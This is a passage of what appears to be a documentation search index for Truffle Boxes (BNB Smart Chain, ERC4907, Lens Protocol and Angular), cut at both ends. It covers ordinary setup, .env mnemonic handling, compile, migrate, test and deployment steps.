"boxes/BSC-Truffle-Starter-Box/#setup", "text": "", "title": "Setup"}, {"location": "boxes/BSC-Truffle-Starter-Box/#using-the-env-file", "text": "You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.bsc.js file expects a MNEMONIC value to exist in .env for running migrations on the networks listed in truffle-config.bsc.js . If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: Use touch .env in the command line to create a .env file at the root of your project. Open the .env file in your preferred IDE Add the following, filling in your own mnemonic: MNEMONIC=\"<Your Mnemonic>\" As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] .", "title": "Using the env File"}, {"location": "boxes/BSC-Truffle-Starter-Box/#new-configuration-file", "text": "A new configuration file exists in this project: truffle-config.bsc.js . This file contains a reference to the new file location of the contracts_build_directory for BNB Smart Chain contracts and lists several networks that are running the BNB Smart Chain network instance (see below ). Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to on localhost for local development. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/local-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/local-dev folder.", "title": "New Configuration File"}, {"location": "boxes/BSC-Truffle-Starter-Box/#new-directory-structure-for-artifacts", "text": "When you compile or migrate, the resulting json files will be at build/bsc-contracts/ . This is to distinguish them from contracts you build for any other network other than BSC. As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference!", "title": "New Directory Structure for Artifacts"}, {"location": "boxes/BSC-Truffle-Starter-Box/#bnb-smart-chain", "text": "", "title": "BNB Smart Chain"}, {"location": "boxes/BSC-Truffle-Starter-Box/#compiling", "text": "You do not need to add any new compilers or settings to compile your contracts for the BNB Smart Chain, as it is fully EVM compatible. The truffle-config.bsc.js configuration file indicates the contract and build paths for BSC-destined contracts. If you are compiling contracts specifically for the BNB Smart Chain network, use the following command, which indicates the appropriate configuration file: npm run compile:bsc If you would like to recompile previously compiled contracts, you can manually run this command with truffle compile --config=truffle-config.bsc.js and add the --all flag.", "title": "Compiling"}, {"location": "boxes/BSC-Truffle-Starter-Box/#migrating", "text": "To migrate on the BNB Smart Chain network, run npm run migrate:bsc --network=(bscTestnet | bscMainnet) (remember to choose a network from these options!). As you can see, you have two BSC networks to choose from: bscTestnet : This is the BNB Smart Chain testnet. bscMainnet : This is the BNB Smart Chain mainnet. Caution! If you deploy to this network using a connected wallet, the fees are charged in mainnet BNB. If you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.bsc.js --network= (bscTestnet | bscMainnet) and add the --reset flag.", "title": "Migrating"}, {"location": "boxes/BSC-Truffle-Starter-Box/#paying-for-migrations", "text": "To pay for your deployments, you will need to have an account with BNB available to spend. You will need your mnemomic phrase (saved in the .env file or through some other secure method). The first account generated by the seed needs to have the BNB you need to deploy. If you do not have a wallet with funds to deploy, you will need to connect a wallet to at least one of the networks above. For testing, this means you will want to connect a wallet to the BSC Testnet network. We recommend using MetaMask . Documentation for how to set up MetaMask to configure custom network like BSc Testnet can be found here . Follow the steps in the documentation above using the BNB Smart Chain RPC endpoints ( https://docs.bnbchain.org/docs/rpc ). The chainId values are the same as those in the truffle-config.bsc.js networks entries. To get testnet BNB tokens use the official faucet .", "title": "Paying for Migrations"}, {"location": "boxes/BSC-Truffle-Starter-Box/#basic-commands", "text": "The code here will allow you to compile, migrate, and test your code on the BNB Smart Chain. The following commands can be run (more details on each can be found in the next section): To compile: npm run compile:bsc To migrate: npm run migrate:bsc --network=(bscTestnet | bscMainnet) To test: npm run test:bsc --network=(bscTestnet | bscMainnet)", "title": "Basic Commands"}, {"location": "boxes/BSC-Truffle-Starter-Box/#testing", "text": "In order to run the test currently in the boilerplate, use the following command: npm run test:bsc --network=(bscTestnet | bscMainnet) (remember to choose a network!). The current test file just has some boilerplate tests to get you started. You will likely want to add network-specific tests to ensure your contracts are behaving as expected.", "title": "Testing"}, {"location": "boxes/BSC-Truffle-Starter-Box/#support", "text": "Support for this box is available via the Truffle community here or on our official Discord Channel .", "title": "Support"}, {"location": "boxes/ERC4907%20Box/", "text": "Truffle Box For ERC4907 \u00b6 Truffle Box For ERC4907 Requirements Setup Installation Support Requirements \u00b6 The Truffle Box For ERC4907 has the following requirements: Node.js 14.x or later NPM version 5.2 or later Truffle Ganache Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account Setup \u00b6 Installation \u00b6 First ensure you are in a new and empty directory. truffle unbox emojidao/ERC4907Box If you want to create a directory, you can also run: truffle unbox emojidao/ERC4907Box <Directory Name> Running the unbox command should install the required dependencies. Now, run the development console. This will spin up and allow you to interact with ganache , a local test chain on localhost:9545 . truffle develop Compile and migrate the smart contracts. Running migrate will do both. Note inside the development console we don't have to preface commands with truffle . migrate In the client directory, we run the React app. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) cd client npm install npm run start After migrating your contracts, head to the client directory and run npm run start to view the application in your http://localhost:3000/ . To mint your first NFT, you'll need to connect your wallet to a network. To do so, make sure your development console is still running. Then, connect to that network using your wallet. Afterwards, you'll need to use a funded account. You can import an account to your MetaMask wallet by using a private key outputted by the development console. If you minted your NFT on localhost:9545 on the developer console, you should be able to see the mint on your MetaMask wallet. If you deploy to Goerli , you will be able to see the NFT on their test-net site here . To build the application for production, use the build script. A production build will be in the client/build folder. // ensure you are inside the client directory when running this npm run build Deployment \u00b6 To deploy your contracts to a public network (such as a testnet or mainnet) there are two approaches. The first uses Truffle Dashboard which provides \"an easy way to use your existing MetaMask wallet for your deployments\". The second, requires copying your private key or mnemonic into your project so the deployment transactions can be signed prior to submission to the network. Using Truffle Dashboard (recommended) \u00b6 Truffle Dashboard ships with Truffle and can be started with truffle dashboard . This in turn loads the dashboard at http://localhost:24012 and beyond that you'll just need to run your migration ( truffle migrate --network dashboard ). A more detailed guide to using Truffle Dashboard is available here . Using the env File \u00b6 You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.js file expects a MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the Arbitrum network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"<YOUR MNEMONIC HERE>\" INFURA_KEY=\"<Your Infura Project ID>\" RINKEBY_MNEMONIC=\"<Your Rinkeby Mnemonic>\" MAINNET_MNEMONIC=\"<Your Mainnet Mnemonic>\" 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] . Support \u00b6 Support for this box is available via the Truffle community available here .", "title": "Truffle Box For ERC4907"}, {"location": "boxes/ERC4907%20Box/#truffle-box-for-erc4907", "text": "Truffle Box For ERC4907 Requirements Setup Installation Support", "title": "Truffle Box For ERC4907"}, {"location": "boxes/ERC4907%20Box/#requirements", "text": "The Truffle Box For ERC4907 has the following requirements: Node.js 14.x or later NPM version 5.2 or later Truffle Ganache Windows, Linux or MacOS Helpful, but optional: - An Infura account and Project ID - A MetaMask account", "title": "Requirements"}, {"location": "boxes/ERC4907%20Box/#setup", "text": "", "title": "Setup"}, {"location": "boxes/ERC4907%20Box/#installation", "text": "First ensure you are in a new and empty directory. truffle unbox emojidao/ERC4907Box If you want to create a directory, you can also run: truffle unbox emojidao/ERC4907Box <Directory Name> Running the unbox command should install the required dependencies. Now, run the development console. This will spin up and allow you to interact with ganache , a local test chain on localhost:9545 . truffle develop Compile and migrate the smart contracts. Running migrate will do both. Note inside the development console we don't have to preface commands with truffle . migrate In the client directory, we run the React app. Smart contract changes must be manually recompiled and migrated. // in another terminal (i.e. not in the truffle develop prompt) cd client npm install npm run start After migrating your contracts, head to the client directory and run npm run start to view the application in your http://localhost:3000/ . To mint your first NFT, you'll need to connect your wallet to a network. To do so, make sure your development console is still running. Then, connect to that network using your wallet. Afterwards, you'll need to use a funded account. You can import an account to your MetaMask wallet by using a private key outputted by the development console. If you minted your NFT on localhost:9545 on the developer console, you should be able to see the mint on your MetaMask wallet. If you deploy to Goerli , you will be able to see the NFT on their test-net site here . To build the application for production, use the build script. A production build will be in the client/build folder. // ensure you are inside the client directory when running this npm run build", "title": "Installation"}, {"location": "boxes/ERC4907%20Box/#deployment", "text": "To deploy your contracts to a public network (such as a testnet or mainnet) there are two approaches. The first uses Truffle Dashboard which provides \"an easy way to use your existing MetaMask wallet for your deployments\". The second, requires copying your private key or mnemonic into your project so the deployment transactions can be signed prior to submission to the network.", "title": "Deployment"}, {"location": "boxes/ERC4907%20Box/#using-truffle-dashboard-recommended", "text": "Truffle Dashboard ships with Truffle and can be started with truffle dashboard . This in turn loads the dashboard at http://localhost:24012 and beyond that you'll just need to run your migration ( truffle migrate --network dashboard ). A more detailed guide to using Truffle Dashboard is available here .", "title": "Using Truffle Dashboard (recommended)"}, {"location": "boxes/ERC4907%20Box/#using-the-env-file", "text": "You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.js file expects a MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the Arbitrum network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: 1) Use touch .env in the command line to create a .env file at the root of your project. 2) Open the .env file in your preferred IDE 3) Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"<YOUR MNEMONIC HERE>\" INFURA_KEY=\"<Your Infura Project ID>\" RINKEBY_MNEMONIC=\"<Your Rinkeby Mnemonic>\" MAINNET_MNEMONIC=\"<Your Mainnet Mnemonic>\" 4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] .", "title": "Using the env File"}, {"location": "boxes/ERC4907%20Box/#support", "text": "Support for this box is available via the Truffle community available here .", "title": "Support"}, {"location": "boxes/Lens%20Box/", "text": "&&&&& &&&&&&&&&&&&&&&&&&&&&&&& &&&&&&&&&& &&&&& /&&&&&&&&&&&&&&&&& &&&&& &&&&&&&&&&&&&&&&&&&&&&&& &&&& &&&&& &&&&& &&&&&&( .&&&&&&* &&&&& &&&&& &&&& &&&&& &&&&& &&&&/ &&&&& &&&&& &&&&& &&&& &&&&& &&&&& &&&&& &&&&, &&&&& &&&&& &&&& &&&&& &&&&& &&&&& &&&&& &&&&& &&&&& &&&& &&&&& &&&&& &&&&&& &&&&& &&&&& &&&& &&&&% &&&&& &&&&&&&&&&& &&&&& &&&&&&&&&&&&&&&&&&&& &&&& &&&&/ &&&&& &&&&&&&&&&&&&& &&&&& &&&&& &&&& &&&&* &&&&& ,&&&&&&&& &&&&& &&&&& &&&& &&&& &&&&& (&&&&& &&&&& &&&&& &&&& &&&& &&&&& &&&&& &&&& &&&&& &&&&& &&&& &&&& &&&&& &&&& &&&& &&&&& &&&&& &&&& *&&&& &&&&& /&&&&& &&&&& &&&&&&&&&&&&&&&&&&&&&&&&& &&&&&&&&&&&&&&&&&&&&&&&& &&&& (&&&& &&&&& &&&&&&& &&&&&&& &&&&&&&&&&&&&&&&&&&&&&&&& &&&&&&&&&&&&&&&&&&&&&&&& &&&& %&&&&&&&&&& &&&&&&&&&&&&&&&&&, _( )_ _ wWWWw _ _( )_ _ wWWWw _ @@@@ (_ _) ( ) _ @@@@ (___) _( )_ @@@@ (_ _) ( ) _ @@@@ (___) _( )_ @@()@@ wWWWw (_)\\ ( ) _( )_ @@()@@ Y (_ _) @@()@@ wWWWw (_)\\ ( ) _( )_ @@()@@ Y (_ _) @@@@ (___) |/ ( ) (_____) @@@@ \\|/ (_)\\ @@@@ (___) |/ ( ) (_____) @@@@ \\|/ (_)\\ / Y \\| (_) | \\| |/ | / Y \\| (_) | \\| |/ | \\ | \\|/ | / \\ | / \\|/ |/ \\ \\|/ \\ | \\|/ | / \\ | / \\|/ |/ \\ \\|/ | | | | | | | | | | | | | | | | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ _//|\\_ | |\\ _//|\\_ /|\\ |\\_ |\\___ |\\ _//|\\_ | |\\ _//|\\_ /|\\ |\\_ |\\___ |\\ | \\_/ / \\__ / \\_ | \\ _/ | _| | \\_/ / \\__ / \\_ | \\ _/ | _| /|\\_ _/ _/\\ \\__ /\\_ / \\_ |_ /|\\_ _/ _/\\ \\__ /\\_ / \\_ |_ / | | \\___ \\_ /\\ \\ / / | | \\___ \\_ /\\ \\ / Lens Protocol \u00b6 The Lens Protocol is a decentralized, non-custodial social graph. Lens implements unique, on-chain social interaction mechanisms analogous to commonly understood Web2 social media interactions, but significantly expanded with unique functionality that empower communities to form and participants to own their own social graph. Setup \u00b6 For now only Linux and macOS are known to work We are now figuring out what works for Windows, instructions will be updated soon (feel free to experiment and submit PR's) The environment is built using Docker Compose, note that your .env file must have the RPC URL of the network you want to use, and an optional MNEMONIC and BLOCK_EXPLORER_KEY , defined like so, assuming you choose to use Mumbai network: MNEMONIC=\"MNEMONIC YOU WANT TO DERIVE WALLETS FROM HERE\" MUMBAI_RPC_URL=\"YOUR RPC URL HERE\" BLOCK_EXPLORER_KEY=\"YOUR BLOCK EXPLORER API KEY HERE\" With the environment file set up, you can move on to using Docker: export USERID = $UID && docker-compose build && docker-compose run --name lens contracts-env bash If you need additional terminals: docker exec -it lens bash From there, have fun! Here are a few self-explanatory scripts: npm run test npm run coverage npm run compile Cleanup leftover Docker containers: USERID = $UID docker-compose down Protocol Overview \u00b6 The Lens Protocol transfers ownership of social graphs to the participants of that graph themselves. This is achieved by creating direct links between profiles and their followers , while allowing fine-grained control of additional logic, including monetization, to be executed during those interactions on a profile-by-profile basis. Here's how it works... Profiles \u00b6 Any address can create a profile and receive an ERC-721 Lens Profile NFT. Profiles are represented by a ProfileStruct : /** * @notice A struct containing profile data. * * @param pubCount The number of publications made to this profile. * @param followNFT The address of the followNFT associated with this profile, can be empty.. * @param followModule The address of the current follow module in use by this profile, can be empty. * @param handle The profile's associated handle. * @param uri The URI to be displayed for the profile NFT. */ struct ProfileStruct { uint256 pubCount; address followNFT; address followModule; string handle; string uri; } Profiles have a specific URI associated with them, which is meant to include metadata, such as a link to a profile picture or a display name for instance, the JSON standard for this URI is not yet determined. Profile owners can always change their follow module or profile URI. Publications \u00b6 Profile owners can publish to any profile they own. There are three publication types: Post , Comment and Mirror . Profile owners can also set and initialize the Follow Module associated with their profile. Publications are on-chain content created and published via profiles. Profile owners can create (publish) three publication types, outlined below. They are represented by a PublicationStruct : /** * @notice A struct containing data associated with each new publication. * * @param profileIdPointed The profile token ID this publication points to, for mirrors and comments. * @param pubIdPointed The publication ID this publication points to, for mirrors and comments. * @param contentURI The URI associated with this publication. * @param referenceModule The address of the current reference module in use by this profile, can be empty. * @param collectModule The address of the collect module associated with this publication, this exists for all publication. * @param collectNFT The address of the collectNFT associated with this publication, if any. */ struct PublicationStruct { uint256 profileIdPointed; uint256 pubIdPointed; string contentURI; address referenceModule; address collectModule; address collectNFT; } Publication Types \u00b6 Post \u00b6 This is the standard publication type, akin to a regular post on traditional social media platforms. Posts contain: A URI, pointing to the actual publication body's metadata JSON, including any images or text. An uninitialized pointer, since pointers are only needed in mirrors and comments. Comment \u00b6 This is a publication type that points back to another publication, whether it be a post, comment or mirror, akin to a regular comment on traditional social media. Comments contain: A URI, just like posts, pointing to the publication body's metadata JSON. An initialized pointer, containing the profile ID and the publication ID of the publication commented on. Mirror \u00b6 This is a publication type that points to another publication, note that mirrors cannot, themselves, be mirrored (doing so instead mirrors the pointed content). Mirrors have no original content of its own. Akin to a \"share\" on traditional social media. Mirrors contain: An empty URI, since they cannot have content associated with them. An initialized pointer, containing the profile ID and the publication ID of the mirrored publication. Profile Interaction \u00b6 There are two types of profile interactions: follows and collects. Follows \u00b6 Wallets can follow profiles, executing modular follow processing logic (in that profile's selected follow module) and receiving a Follow NFT . Each profile has a connected, unique FollowNFT contract, which is first deployed upon successful follow. Follow NFTs are NFTs with integrated voting and delegation capability. The inclusion of voting and delegation right off the bat means that follow NFTs have the built-in capability to create a spontaneous DAO around any profile. Furthermore, holding follow NFTs allows followers to collect publications from the profile they are following (except mirrors, which are equivalent to shares in Web2 social media, and require following the original publishing profile to collect). Collects \u00b6 Collecting works in a modular fashion as well, every publication (except mirrors) requires a Collect Module to be selected and initialized. This module, similarly to follow modules, can contain any arbitrary logic to be executed upon collects. Successful collects result in a new, unique NFT being minted, essentially as a saved copy of the original publication. There is one deployed collect NFT contract per publication, and it's deployed upon the first successful collect. When a mirror is collected, what happens behind the scenes is the original, mirrored publication is collected, and the mirror publisher's profile ID is passed as a \"referrer.\" This allows neat functionality where collect modules that incur a fee can, for instance, reward referrals. Note that the Collected event, which is emitted upon collection, indexes the profile and publication directly being passed, which, in case of a mirror, is different than the actual original publication getting collected (which is emitted unindexed). Alright, that was a mouthful! Let's move on to more specific details about Lens's core principle: Modularity. Lens Modularity \u00b6 Stepping back for a moment, the core concept behind modules is to allow as much freedom as possible to the community to come up with new, innovative interaction mechanisms between social graph participants. For security purposes, this is achieved by including a whitelisted list of modules controlled by governance. To recap, the Lens Protocol has three types of modules: Follow Modules contain custom logic to be executed upon follow. Collect Modules contain custom logic to be executed upon collect. Typically, these modules include at least a check that the collector is a follower. Reference Modules contain custom logic to be executed upon comment and mirror. These modules can be used to limit who is able to comment and interact with a profile. Note that collect and reference modules should not assume that a publication cannot be re-initialized, and thus should include front-running protection as a security measure if needed, as if the publication data was not static. This is even more prominent in follow modules, where it can absolutely be changed for a given profile. Lastly, there is also a ModuleGlobals contract which acts as a central data provider for modules. It is controlled by a specific governance address which can be set to a different executor compared to the Hub's governance. It's expected that modules will fetch dynamically changing data, such as the module globals governance address, the treasury address, the treasury fee as well as a list of whitelisted currencies. Upgradeability \u00b6 This iteration of the Lens Protocol implements a transparent upgradeable proxy for the central hub to be controlled by governance. There are no other aspects of the protocol that are upgradeable. In an ideal world, the hub will not require upgrades due to the system's inherent modularity and openness, upgradeability is there only to implement new, breaking changes that would be impossible, or unreasonable to implement otherwise. This does come with a few caveats, for instance, the ModuleGlobals contract implements a currency whitelist, but it is not upgradeable, so the \"removal\" of a currency whitelist in a module would require a specific new module that does not query the ModuleGlobals contract for whitelisted currencies.", "title": "Index"}, {"location": "boxes/Lens%20Box/#lens-protocol", "text": "The Lens Protocol is a decentralized, non-custodial social graph. Lens implements unique, on-chain social interaction mechanisms analogous to commonly understood Web2 social media interactions, but significantly expanded with unique functionality that empower communities to form and participants to own their own social graph.", "title": "Lens Protocol"}, {"location": "boxes/Lens%20Box/#setup", "text": "For now only Linux and macOS are known to work We are now figuring out what works for Windows, instructions will be updated soon (feel free to experiment and submit PR's) The environment is built using Docker Compose, note that your .env file must have the RPC URL of the network you want to use, and an optional MNEMONIC and BLOCK_EXPLORER_KEY , defined like so, assuming you choose to use Mumbai network: MNEMONIC=\"MNEMONIC YOU WANT TO DERIVE WALLETS FROM HERE\" MUMBAI_RPC_URL=\"YOUR RPC URL HERE\" BLOCK_EXPLORER_KEY=\"YOUR BLOCK EXPLORER API KEY HERE\" With the environment file set up, you can move on to using Docker: export USERID = $UID && docker-compose build && docker-compose run --name lens contracts-env bash If you need additional terminals: docker exec -it lens bash From there, have fun! Here are a few self-explanatory scripts: npm run test npm run coverage npm run compile Cleanup leftover Docker containers: USERID = $UID docker-compose down", "title": "Setup"}, {"location": "boxes/Lens%20Box/#protocol-overview", "text": "The Lens Protocol transfers ownership of social graphs to the participants of that graph themselves. This is achieved by creating direct links between profiles and their followers , while allowing fine-grained control of additional logic, including monetization, to be executed during those interactions on a profile-by-profile basis. Here's how it works...", "title": "Protocol Overview"}, {"location": "boxes/Lens%20Box/#profiles", "text": "Any address can create a profile and receive an ERC-721 Lens Profile NFT. Profiles are represented by a ProfileStruct : /** * @notice A struct containing profile data. * * @param pubCount The number of publications made to this profile. * @param followNFT The address of the followNFT associated with this profile, can be empty.. * @param followModule The address of the current follow module in use by this profile, can be empty. * @param handle The profile's associated handle. * @param uri The URI to be displayed for the profile NFT. */ struct ProfileStruct { uint256 pubCount; address followNFT; address followModule; string handle; string uri; } Profiles have a specific URI associated with them, which is meant to include metadata, such as a link to a profile picture or a display name for instance, the JSON standard for this URI is not yet determined. Profile owners can always change their follow module or profile URI.", "title": "Profiles"}, {"location": "boxes/Lens%20Box/#publications", "text": "Profile owners can publish to any profile they own. There are three publication types: Post , Comment and Mirror . Profile owners can also set and initialize the Follow Module associated with their profile. Publications are on-chain content created and published via profiles. Profile owners can create (publish) three publication types, outlined below. They are represented by a PublicationStruct : /** * @notice A struct containing data associated with each new publication. * * @param profileIdPointed The profile token ID this publication points to, for mirrors and comments. * @param pubIdPointed The publication ID this publication points to, for mirrors and comments. * @param contentURI The URI associated with this publication. * @param referenceModule The address of the current reference module in use by this profile, can be empty. * @param collectModule The address of the collect module associated with this publication, this exists for all publication. * @param collectNFT The address of the collectNFT associated with this publication, if any. */ struct PublicationStruct { uint256 profileIdPointed; uint256 pubIdPointed; string contentURI; address referenceModule; address collectModule; address collectNFT; }", "title": "Publications"}, {"location": "boxes/Lens%20Box/#publication-types", "text": "", "title": "Publication Types"}, {"location": "boxes/Lens%20Box/#post", "text": "This is the standard publication type, akin to a regular post on traditional social media platforms. Posts contain: A URI, pointing to the actual publication body's metadata JSON, including any images or text. An uninitialized pointer, since pointers are only needed in mirrors and comments.", "title": "Post"}, {"location": "boxes/Lens%20Box/#comment", "text": "This is a publication type that points back to another publication, whether it be a post, comment or mirror, akin to a regular comment on traditional social media. Comments contain: A URI, just like posts, pointing to the publication body's metadata JSON. An initialized pointer, containing the profile ID and the publication ID of the publication commented on.", "title": "Comment"}, {"location": "boxes/Lens%20Box/#mirror", "text": "This is a publication type that points to another publication, note that mirrors cannot, themselves, be mirrored (doing so instead mirrors the pointed content). Mirrors have no original content of its own. Akin to a \"share\" on traditional social media. Mirrors contain: An empty URI, since they cannot have content associated with them. An initialized pointer, containing the profile ID and the publication ID of the mirrored publication.", "title": "Mirror"}, {"location": "boxes/Lens%20Box/#profile-interaction", "text": "There are two types of profile interactions: follows and collects.", "title": "Profile Interaction"}, {"location": "boxes/Lens%20Box/#follows", "text": "Wallets can follow profiles, executing modular follow processing logic (in that profile's selected follow module) and receiving a Follow NFT . Each profile has a connected, unique FollowNFT contract, which is first deployed upon successful follow. Follow NFTs are NFTs with integrated voting and delegation capability. The inclusion of voting and delegation right off the bat means that follow NFTs have the built-in capability to create a spontaneous DAO around any profile. Furthermore, holding follow NFTs allows followers to collect publications from the profile they are following (except mirrors, which are equivalent to shares in Web2 social media, and require following the original publishing profile to collect).", "title": "Follows"}, {"location": "boxes/Lens%20Box/#collects", "text": "Collecting works in a modular fashion as well, every publication (except mirrors) requires a Collect Module to be selected and initialized. This module, similarly to follow modules, can contain any arbitrary logic to be executed upon collects. Successful collects result in a new, unique NFT being minted, essentially as a saved copy of the original publication. There is one deployed collect NFT contract per publication, and it's deployed upon the first successful collect. When a mirror is collected, what happens behind the scenes is the original, mirrored publication is collected, and the mirror publisher's profile ID is passed as a \"referrer.\" This allows neat functionality where collect modules that incur a fee can, for instance, reward referrals. Note that the Collected event, which is emitted upon collection, indexes the profile and publication directly being passed, which, in case of a mirror, is different than the actual original publication getting collected (which is emitted unindexed). Alright, that was a mouthful! Let's move on to more specific details about Lens's core principle: Modularity.", "title": "Collects"}, {"location": "boxes/Lens%20Box/#lens-modularity", "text": "Stepping back for a moment, the core concept behind modules is to allow as much freedom as possible to the community to come up with new, innovative interaction mechanisms between social graph participants. For security purposes, this is achieved by including a whitelisted list of modules controlled by governance. To recap, the Lens Protocol has three types of modules: Follow Modules contain custom logic to be executed upon follow. Collect Modules contain custom logic to be executed upon collect. Typically, these modules include at least a check that the collector is a follower. Reference Modules contain custom logic to be executed upon comment and mirror. These modules can be used to limit who is able to comment and interact with a profile. Note that collect and reference modules should not assume that a publication cannot be re-initialized, and thus should include front-running protection as a security measure if needed, as if the publication data was not static. This is even more prominent in follow modules, where it can absolutely be changed for a given profile. Lastly, there is also a ModuleGlobals contract which acts as a central data provider for modules. It is controlled by a specific governance address which can be set to a different executor compared to the Hub's governance. It's expected that modules will fetch dynamically changing data, such as the module globals governance address, the treasury address, the treasury fee as well as a list of whitelisted currencies.", "title": "Lens Modularity"}, {"location": "boxes/Lens%20Box/#upgradeability", "text": "This iteration of the Lens Protocol implements a transparent upgradeable proxy for the central hub to be controlled by governance. There are no other aspects of the protocol that are upgradeable. In an ideal world, the hub will not require upgrades due to the system's inherent modularity and openness, upgradeability is there only to implement new, breaking changes that would be impossible, or unreasonable to implement otherwise. This does come with a few caveats, for instance, the ModuleGlobals contract implements a currency whitelist, but it is not upgradeable, so the \"removal\" of a currency whitelist in a module would require a specific new module that does not query the ModuleGlobals contract for whitelisted currencies.", "title": "Upgradeability"}, {"location": "boxes/angular-truffle-box/", "text": "Truffle Box for Angular \u00b6 This Truffle Box provides a base for working with the Truffle Framework and Angular. It provides a basic working example of the MetaCoin contracts with Angular components. This project is generated with Angular CLI . Prerequisites \u00b6 In order to run the Truffle box, you will need Node.js (tested with version 10.x.y). This will include npm , needed to install dependencies. In order install these dependencies, you will also need Python (version 2.7.x) and git . You will also need the MetaMask plugin for Chrome. Building \u00b6 Install truffle, Angular CLI and an Ethereum client. If you don't have a test environment, we recommend ganache-cli npm install -g truffle npm install -g @angular/cli npm install -g ganache-cli Download the box. truffle unbox Quintor/angular-truffle-box Run your Ethereum client. For Ganache CLI: ganache-cli Note the mnemonic 12-word phrase printed on startup, you will need it later. Compile and migrate your contracts. truffle compile && truffle migrate Configuration \u00b6 In order to connect with the Ethereum network, you will need to configure MetaMask Log into the ganache-cli test accounts in MetaMask, using the 12-word phrase printed earlier. A detailed explaination of how to do this can be found here Normally, the available test accounts will change whenever you restart ganache-cli . In order to receive the same test accounts every time you start ganache-cli , start it with a seed like this: ganache-cli --seed 0 or ganache-cli -m \"put your mnemonic phrase here needs twelve words to work with MetaMask\" Point MetaMask to ganache-cli by connecting to the network localhost:8545 Running \u00b6 Run the app using Angular CLI: npm start The app is now served on localhost:4200 Making sure you have configured MetaMask, visit http://localhost:4200 in your browser. Send MetaCoins! Testing \u00b6 Running the Angular component tests: ng test Running the Truffle tests: truffle test Running Protactor end-to-end tests ng e2e Releasing \u00b6 Using the Angular CLI you can build a distributable of your app. Will be placed in dist/ ng build FAQ \u00b6 Where can I find more documentation? This Truffle box is a union of Truffle and an Angular setup created with Angular CLI . For solidity compilation and Ethereum related issues, try the Truffle documentation . For Angular CLI and typescript issues, refer to the Angular CLI documentation Common errors and their solutions Error Solution Module not found: Error: Can't resolve '../../../../build/contracts/MetaCoin.json' during ng serve Run truffle compile Error: the tx doesn't have the correct nonce. in MetaMask Reset MetaMask: Settings -> Reset Account Error getting balance; see log. in UI, with Error: MetaCoin has not been deployed to detected network (network/artifact mismatch) in browser console Ensure you have started ganache, run truffle migrate and configured MetaMask to point to ganache How do I get this to work on Windows? Possible issues: If you're missing a C++ compiler, run npm install --global --production windows-build-tools in a cmd with administrative rights. If the truffle.js file opens when you're trying to run truffle commands, rename the file to truffle-config.js", "title": "Truffle Box for Angular"}, {"location": "boxes/angular-truffle-box/#truffle-box-for-angular", "text": "This Truffle Box provides a base for working with the Truffle Framework and Angular. It provides a basic working example of the MetaCoin contracts with Angular components. This project is generated with Angular CLI .", "title": "Truffle Box for Angular"}, {"location": "boxes/angular-truffle-box/#prerequisites", "text": "In order to run the Truffle box, you will need Node.js (tested with version 10.x.y). This will include npm , needed to install dependencies. In order install these dependencies, you will also need Python (version 2.7.x) and git . You will also need the MetaMask plugin for Chrome.", "title": "Prerequisites"}, {"location": "boxes/angular-truffle-box/#building", "text": "Install truffle, Angular CLI and an Ethereum client. If you don't have a test environment, we recommend ganache-cli npm install -g truffle npm install -g @angular/cli npm install -g ganache-cli Download the box. truffle unbox Quintor/angular-truffle-box Run your Ethereum client. For Ganache CLI: ganache-cli Note the mnemonic 12-word phrase printed on startup, you will need it later. Compile and migrate your contracts. truffle compile && truffle migrate", "title": "Building"}, {"location": "boxes/angular-truffle-box/#configuration", "text": "In order to connect with the Ethereum network, you will need to configure MetaMask Log into the ganache-cli test accounts in MetaMask, using the 12-word phrase printed earlier. A detailed explaination of how to do this can be found here Normally, the available test accounts will change whenever you restart ganache-cli . In order to receive the same test accounts every time you start ganache-cli , start it with a seed like this: ganache-cli --seed 0 or ganache-cli -m \"put your mnemonic phrase here needs twelve words to work with MetaMask\" Point MetaMask to ganache-cli by connecting to the network localhost:8545", "title": "Configuration"}, {"location": "boxes/angular-truffle-box/#running", "text": "Run the app using Angular CLI: npm start The app is now served on localhost:4200 Making sure you have configured MetaMask, visit http://localhost:4200 in your browser. Send MetaCoins!", "title": "Running"}, {"location": "boxes/angular-truffle-box/#testing", "text": "Running the Angular component tests: ng test Running the Truffle tests: truffle test Running Protactor end-to-end tests ng e2e", "title": "Testing"}, {"location": 